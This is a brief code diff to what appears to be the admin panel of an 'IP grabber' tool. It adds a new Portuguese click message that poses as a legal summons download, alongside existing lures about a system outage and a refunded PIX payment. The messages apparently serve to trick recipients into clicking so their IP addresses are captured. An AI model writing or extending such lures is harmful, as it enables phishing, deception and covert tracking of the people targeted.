@@ -143,6 +143,7 @@ class IpGrabberResource extends Resource
                             IpGrabber::DEFAULT_CLICK_MESSAGE => IpGrabber::DEFAULT_CLICK_MESSAGE,
                             'Sistema fora do ar' => 'Sistema fora do ar',
                             'PIX Estornado' => 'PIX Estornado',
+                            'Aceite e aguarde o download da intimação' => 'Aceite e aguarde o download da intimação',
                         ])
                         ->default(IpGrabber::DEFAULT_CLICK_MESSAGE)
                         ->selectablePlaceholder(false)
